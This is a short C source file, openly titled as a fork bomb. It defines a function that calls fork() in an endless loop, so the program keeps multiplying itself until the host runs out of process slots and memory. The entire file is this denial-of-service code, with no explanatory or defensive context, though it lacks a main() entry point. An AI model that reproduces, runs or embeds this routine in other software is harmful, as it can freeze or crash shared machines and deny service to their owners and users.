/*
*	FORKBOMB (in C)
*
*
*/

//LIBRARIES
#include <unistd.h>

void forkbomb(){
	pid_t pid;
	// keep forking
	while(1) {
		pid = fork(); // creates a whole new copy of the previous process
		switch(pid){
			case 0:
				//printf("CRASHING\n");
				break;
			default:
				//printf("RUNNING\n");
				break;
		}
	}
}